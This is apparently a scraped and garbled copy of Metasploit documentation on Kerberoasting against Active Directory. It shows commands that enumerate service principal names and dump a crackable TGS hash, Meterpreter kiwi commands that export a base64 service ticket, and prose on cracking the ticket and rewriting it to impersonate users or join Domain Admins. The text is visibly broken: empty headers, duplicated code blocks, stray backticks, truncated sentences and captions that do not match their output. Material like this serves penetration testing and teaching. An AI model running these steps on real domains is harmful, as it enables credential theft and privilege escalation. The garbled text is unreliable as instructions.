## Kerberoasting
## Vulnerable Targets
## Lab Environment
example of this technique:
```
use auxiliary/gather/get_user_spns
run rhost=192.168.123.13 user=<username> pass=<password> domain=<domain>
```

## Scenarios
### Using get_user_spns
which can be bruteforced:
```msf
msf6 auxiliary(gather/get_user_spns) > run rhost=192.168.123.13 user=Administrator pass=p4$$w0rd domain=adf3.local

[*] Running for 192.168.123.13...
[+] ServicePrincipalName                    Name                MemberOf  PasswordLastSet             LastLogon  Delegation
[+] --------------------------------------  ------------------  --------  --------------------------  ---------  ----------
[+] DC3/svc_kerberoastable.ADF3.LOCAL:1337  svc_kerberoastable            2023-01-23 23:52:19.445592  <never>
[+] $krb5tgs$23$*svc_kerberoastable$ADF3.LOCAL$adf3.local/svc_kerberoastable*$c2e73c1dcdcef4c926cb263abedf75ed$263fea3ad446bd6b4b8... etc etc ...
```

If you followed the lab setup setup above, this should output the following result:
```msf
meterpreter > kerberos_ticket_list
[+] Kerberos tickets found in the current session.
[00000000] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 12/16/2022 3:35:41 PM ; 12/17/2022 1:35:41 AM ; 12/23/2022 3:35:41 PM
   Server Name       : krbtgt/EXAMPLE.COM @ EXAMPLE.COM
   Client Name       : Administrator @ EXAMPLE.COM
   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;

[00000001] - 0x00000017 - rc4_hmac_nt
   Start/End/MaxRenew: 12/16/2022 4:58:34 PM ; 12/17/2022 1:35:41 AM ; 12/23/2022 3:35:41 PM
   Server Name       : https/TSTWLPT1000000 @ EXAMPLE.COM
   Client Name       : Administrator @ EXAMPLE.COM
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
```

You can run Hashcat to crack the hash with a wordlist of choice, and see if the status of the hash has been marked as cracked:
```msf
meterpreter > kiwi_cmd kerberos::list /export

[00000001] - 0x00000017 - rc4_hmac_nt
   Start/End/MaxRenew: 12/16/2022 4:58:34 PM ; 12/17/2022 1:35:41 AM ; 12/23/2022 3:35:41 PM
   Server Name       : https/TSTWLPT1000000 @ EXAMPLE.COM
   Client Name       : Administrator @ EXAMPLE.COM
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
====================
Base64 of file : 1-40a10000-Administrator@https~TSTWLPT1000000-EXAMPLE.COM.kirbi
====================
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
MDAwMA==
====================

   * Saved to file     : 1-40a10000-Administrator@https~TSTWLPT1000000-EXAMPLE.COM.kirbi
```

`
use auxiliary/gather/get_user_spns
run rhost=192.168.123.13 user=<username> pass=<password> domain=<domain>
`

`msf
msf6 auxiliary(gather/get_user_spns) > run rhost=192.168.123.13 user=Administrator pass=p4$$w0rd domain=adf3.local

[*] Running for 192.168.123.13...
[+] ServicePrincipalName                    Name                MemberOf  PasswordLastSet             LastLogon  Delegation
[+] --------------------------------------  ------------------  --------  --------------------------  ---------  ----------
[+] DC3/svc_kerberoastable.ADF3.LOCAL:1337  svc_kerberoastable            2023-01-23 23:52:19.445592  <never>
[+] $krb5tgs$23$*svc_kerberoastable$ADF3.LOCAL$adf3.local/svc_kerberoastable*$c2e73c1dcdcef4c926cb263abedf75ed$263fea3ad446bd6b4b8... etc etc ...
`

`

Great, we now have a couple SPNs to move forward with.

**Request Service Tickets - with kiwi**

If you have a running Meterpreter session you can request a Service Ticket using the kiwi extension and one of the SPNs
found above:

`

`msf
meterpreter > kerberos_ticket_list
[+] Kerberos tickets found in the current session.
[00000000] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 12/16/2022 3:35:41 PM ; 12/17/2022 1:35:41 AM ; 12/23/2022 3:35:41 PM
   Server Name       : krbtgt/EXAMPLE.COM @ EXAMPLE.COM
   Client Name       : Administrator @ EXAMPLE.COM
   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;

[00000001] - 0x00000017 - rc4_hmac_nt
   Start/End/MaxRenew: 12/16/2022 4:58:34 PM ; 12/17/2022 1:35:41 AM ; 12/23/2022 3:35:41 PM
   Server Name       : https/TSTWLPT1000000 @ EXAMPLE.COM
   Client Name       : Administrator @ EXAMPLE.COM
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
`

`

**Export Service Tickets**

`

`msf
meterpreter > kiwi_cmd kerberos::list /export

[00000001] - 0x00000017 - rc4_hmac_nt
   Start/End/MaxRenew: 12/16/2022 4:58:34 PM ; 12/17/2022 1:35:41 AM ; 12/23/2022 3:35:41 PM
   Server Name       : https/TSTWLPT1000000 @ EXAMPLE.COM
   Client Name       : Administrator @ EXAMPLE.COM
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
====================
Base64 of file : 1-40a10000-Administrator@https~TSTWLPT1000000-EXAMPLE.COM.kirbi
====================
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
MDAwMA==
====================

   * Saved to file     : 1-40a10000-Administrator@https~TSTWLPT1000000-EXAMPLE.COM.kirbi
`

`

**Crack Kiwi's Service Tickets**

To crack the service ticket a number of tools can be used. In this example we'll use hashcat. First we need to convert
the ticket we retrieved in the `

` format to a format parsable by hashcat. The script **kirbi2john** is part of
[Tim Medin](https://twitter.com/TimMedin) [Kerberoast](https://github.com/nidem/kerberoast) toolkit is perfect for
this task.

First clone the repo then run the script against the `

`

**Rewrite Service Tickets & RAM Injection**

Kerberos tickets are signed with the NTLM hash of the password. If the ticket hash has been cracked then it is possible
to rewrite the ticket with [Kerberoast](https://github.com/nidem/kerberoast) python script. This tactic will allow users
to impersonate any domain user or a fake account when the service is going to be accessed. Additionally privilege
escalation is also possible as the user can be added into an elevated group such as Domain Admins.

`

